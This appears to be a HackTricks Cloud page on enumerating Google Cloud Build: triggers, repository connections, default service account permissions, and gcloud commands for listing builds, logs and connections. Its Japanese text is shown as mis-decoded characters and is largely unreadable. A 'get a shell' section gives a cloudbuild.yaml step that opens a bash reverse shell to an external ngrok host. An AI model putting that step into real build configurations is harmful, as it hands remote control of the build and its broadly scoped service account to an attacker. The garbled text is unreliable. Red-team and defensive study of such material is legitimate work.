# GCP - Cloud Build Enum

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„å ´åˆ**ã‚„**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„å ´åˆ**ã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* **HackTricks**ã®[**GitHubãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’å…±æœ‰ã™ã‚‹ã€‚

</details>

## åŸºæœ¬æƒ…å ±

Google Cloud Buildã¯ã€**ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ãƒªãƒã‚¸ãƒˆãƒª**ã¨çµ±åˆã—ã€å¤šæ§˜ãªãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°è¨€èªã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ç®¡ç†ã•ã‚ŒãŸCI/CDãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã§ã€**ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ãƒ“ãƒ«ãƒ‰**ã¨ãƒªãƒªãƒ¼ã‚¹ãƒ—ãƒ­ã‚»ã‚¹ã‚’**è‡ªå‹•åŒ–**ã—ã¾ã™ã€‚é–‹ç™ºè€…ãŒã‚³ãƒ¼ãƒ‰ã‚’è‡ªå‹•çš„ã«ãƒ“ãƒ«ãƒ‰ã€ãƒ†ã‚¹ãƒˆã€ãƒ‡ãƒ—ãƒ­ã‚¤ã§ãã‚‹ã‚ˆã†ã«ã—ãªãŒã‚‰ã€ãƒ“ãƒ«ãƒ‰ã‚¹ãƒ†ãƒƒãƒ—ã¨ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚’ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚ºã™ã‚‹æŸ”è»Ÿæ€§ã‚’æä¾›ã—ã¾ã™ã€‚

å„Cloud Buildãƒˆãƒªã‚¬ãƒ¼ã¯ã€**Cloudãƒªãƒã‚¸ãƒˆãƒªã«é–¢é€£ã—ã¦ã„ã‚‹ã‹ã€å¤–éƒ¨ãƒªãƒã‚¸ãƒˆãƒªï¼ˆGithubã€Bitbucketã€Gitlabï¼‰ã«ç›´æ¥æ¥ç¶šã•ã‚Œã¦ã„ã¾ã™**ã€‚

{% hint style="success" %}
Github/Bitbucketã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ã“ã“ã‚„Cloudãƒªãƒã‚¸ãƒˆãƒªã‹ã‚‰ç›—ã‚€æ–¹æ³•ã¯è¦‹ã¤ã‘ã‚‰ã‚Œã¾ã›ã‚“ã§ã—ãŸã€‚ãªãœãªã‚‰ã€ãƒªãƒã‚¸ãƒˆãƒªãŒãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã‚‹ã¨ãã¯[https://source.cloud.google.com/](https://source.cloud.google.com/)ã®URLã‚’ä»‹ã—ã¦ã‚¢ã‚¯ã‚»ã‚¹ã•ã‚Œã€Githubã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«ã‚ˆã£ã¦ã‚¢ã‚¯ã‚»ã‚¹ã•ã‚Œãªã„ã‹ã‚‰ã§ã™ã€‚
{% endhint %}

### ã‚¤ãƒ™ãƒ³ãƒˆ

Cloud Buildã¯ä»¥ä¸‹ã®å ´åˆã«ãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œã¾ã™:

* **ãƒ–ãƒ©ãƒ³ãƒã¸ã®ãƒ—ãƒƒã‚·ãƒ¥**: ãƒ–ãƒ©ãƒ³ãƒã‚’æŒ‡å®š
* **æ–°ã—ã„ã‚¿ã‚°ã®ãƒ—ãƒƒã‚·ãƒ¥**: ã‚¿ã‚°ã‚’æŒ‡å®š
* **ãƒ—ãƒ«ãƒªã‚¯ã‚¨ã‚¹ãƒˆ**: PRã‚’å—ã‘å–ã‚‹ãƒ–ãƒ©ãƒ³ãƒã‚’æŒ‡å®š
* **æ‰‹å‹•å‘¼ã³å‡ºã—**
* **Pub/Subãƒ¡ãƒƒã‚»ãƒ¼ã‚¸:** ãƒˆãƒ”ãƒƒã‚¯ã‚’æŒ‡å®š
* **Webhookã‚¤ãƒ™ãƒ³ãƒˆ**: HTTPS URLãŒå…¬é–‹ã•ã‚Œã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã§èªè¨¼ã•ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™

### å®Ÿè¡Œ

3ã¤ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ãŒã‚ã‚Šã¾ã™:

* å®Ÿè¡Œã™ã‚‹ã‚³ãƒãƒ³ãƒ‰ã‚’**æŒ‡å®šã™ã‚‹yaml/json**ã€‚é€šå¸¸ã¯: `/cloudbuild.yaml`
* ã‚¦ã‚§ãƒ–ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã¨CLIã§ã€Œã‚¤ãƒ³ãƒ©ã‚¤ãƒ³ã€ã§æŒ‡å®šã§ãã‚‹å”¯ä¸€ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³
* æœ€ã‚‚ä¸€èˆ¬çš„ãªã‚ªãƒ—ã‚·ãƒ§ãƒ³
* èªè¨¼ã•ã‚Œã¦ã„ãªã„ã‚¢ã‚¯ã‚»ã‚¹ã«é–¢é€£ã™ã‚‹
* ãƒ“ãƒ«ãƒ‰ã™ã‚‹**Dockerfile**
* ãƒ“ãƒ«ãƒ‰ã™ã‚‹**Buildpack**

### SAæ¨©é™

**ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¯`cloud-platform`ã‚¹ã‚³ãƒ¼ãƒ—ã‚’æŒã£ã¦ãŠã‚Š**ã€ã™ã¹ã¦ã®æ¨©é™ã‚’**ä½¿ç”¨ã§ãã¾ã™**ã€‚**SAãŒæŒ‡å®šã•ã‚Œã¦ã„ãªã„å ´åˆ**ï¼ˆä¾‹ãˆã°submitã‚’è¡Œã†ã¨ãï¼‰ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®SA `<proj-number>@cloudbuild.gserviceaccount.com`ãŒ**ä½¿ç”¨ã•ã‚Œã¾ã™**ã€‚

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯æ¨©é™ã¯ä¸ãˆã‚‰ã‚Œã¦ã„ã¾ã›ã‚“ãŒã€ç°¡å˜ã«ã„ãã¤ã‹ã®æ¨©é™ã‚’ä¸ãˆã‚‹ã“ã¨ãŒã§ãã¾ã™:

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### æ‰¿èª

ãƒ“ãƒ«ãƒ‰å®Ÿè¡Œã«æ‰¿èªãŒå¿…è¦ãªCloud Buildã‚’è¨­å®šã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ç„¡åŠ¹ï¼‰ã€‚

### æ¥ç¶š & ãƒªãƒã‚¸ãƒˆãƒª

æ¥ç¶šã¯ä»¥ä¸‹ã‚’é€šã˜ã¦ä½œæˆã§ãã¾ã™:

* **GitHub:** OAuthãƒ—ãƒ­ãƒ³ãƒ—ãƒˆãŒè¡¨ç¤ºã•ã‚Œã€**Githubãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã™ã‚‹ãŸã‚ã®æ¨©é™ã‚’æ±‚ã‚ã‚‰ã‚Œã¾ã™**ã€‚ãã®å¾Œã€**Secret Manager**å†…ã«ãƒˆãƒ¼ã‚¯ãƒ³ãŒä¿å­˜ã•ã‚Œã¾ã™ã€‚
* **GitHub Enterprise:** **GithubApp**ã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã‚’æ±‚ã‚ã‚‰ã‚Œã¾ã™ã€‚GitHub Enterpriseãƒ›ã‚¹ãƒˆã‹ã‚‰ã®**èªè¨¼ãƒˆãƒ¼ã‚¯ãƒ³**ãŒä½œæˆã•ã‚Œã€ã“ã®ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã®**Secret Manager**ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã¨ã—ã¦ä¿å­˜ã•ã‚Œã¾ã™ã€‚
* **GitLab / Enterprise:** **APIã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã¨Read APIã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æä¾›ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ã€‚ã“ã‚Œã‚‰ã¯**Secret Manager**ã«ä¿å­˜ã•ã‚Œã¾ã™ã€‚

æ¥ç¶šãŒç”Ÿæˆã•ã‚Œã‚‹ã¨ã€Githubã‚¢ã‚«ã‚¦ãƒ³ãƒˆãŒã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’æŒã£ã¦ã„ã‚‹ãƒªãƒã‚¸ãƒˆãƒªã«ãƒªãƒ³ã‚¯ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚

ã“ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¯ä»¥ä¸‹ã®ãƒœã‚¿ãƒ³ã‹ã‚‰åˆ©ç”¨å¯èƒ½ã§ã™:

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
ã“ã®æ–¹æ³•ã§æ¥ç¶šã•ã‚ŒãŸãƒªãƒã‚¸ãƒˆãƒªã¯ã€**2ä¸–ä»£ç›®ã‚’ä½¿ç”¨ã™ã‚‹ãƒˆãƒªã‚¬ãƒ¼ã§ã®ã¿åˆ©ç”¨å¯èƒ½ã§ã‚ã‚‹**ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚
{% endhint %}

### ãƒªãƒã‚¸ãƒˆãƒªã®æ¥ç¶š

ã“ã‚Œã¯**`connection`**ã¨åŒã˜ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€**Githubã‚„Bitbucket**ãƒªãƒã‚¸ãƒˆãƒªã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹**ç•°ãªã‚‹**æ–¹æ³•ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ãŒã€æ¥ç¶šã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯ç”Ÿæˆã•ã‚Œã¾ã›ã‚“ãŒã€ãƒªãƒã‚¸ãƒˆãƒªã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆï¼ˆ1ä¸–ä»£ç›®ï¼‰ã¯ç”Ÿæˆã•ã‚Œã¾ã™ã€‚

ã“ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¯ä»¥ä¸‹ã®ãƒœã‚¿ãƒ³ã‹ã‚‰åˆ©ç”¨å¯èƒ½ã§ã™:

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

### ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸

Cloud Buildã¯ã€ãƒˆãƒªã‚¬ãƒ¼ã®ãŸã‚ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä¿å­˜ã™ã‚‹æ–°ã—ã„ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸ã‚’**ç”Ÿæˆã™ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™**ã€‚ã“ã‚Œã¯ä¾‹ãˆã°ã€GCPãŒæä¾›ã™ã‚‹ä¾‹ã§ç™ºç”Ÿã—ã¾ã™:
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
### ã‚·ã‚§ãƒ«ã‚’å–å¾—

Storageãƒã‚±ãƒƒãƒˆ[security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox)ãŒä½œæˆã•ã‚Œã€ä½¿ç”¨ã™ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ãŒå«ã¾ã‚ŒãŸ`.tgz`ã‚’ä¿å­˜ã—ã¾ã™ã€‚
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
### åˆ—æŒ™

ãƒ“ãƒ«ãƒ‰è¨­å®šã¨ãƒ­ã‚°ã«**æ©Ÿå¯†æƒ…å ±ãŒè¦‹ã¤ã‹ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™**ã€‚
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### æ¨©é™æ˜‡æ ¼

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### èªè¨¼ã•ã‚Œã¦ã„ãªã„ã‚¢ã‚¯ã‚»ã‚¹

{% content-ref url="../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### æ”»æ’ƒå¾Œã®æ´»å‹•

{% content-ref url="../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ã§<strong>AWSã®ãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã§**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã™ã‚‹**ã€‚

</details>
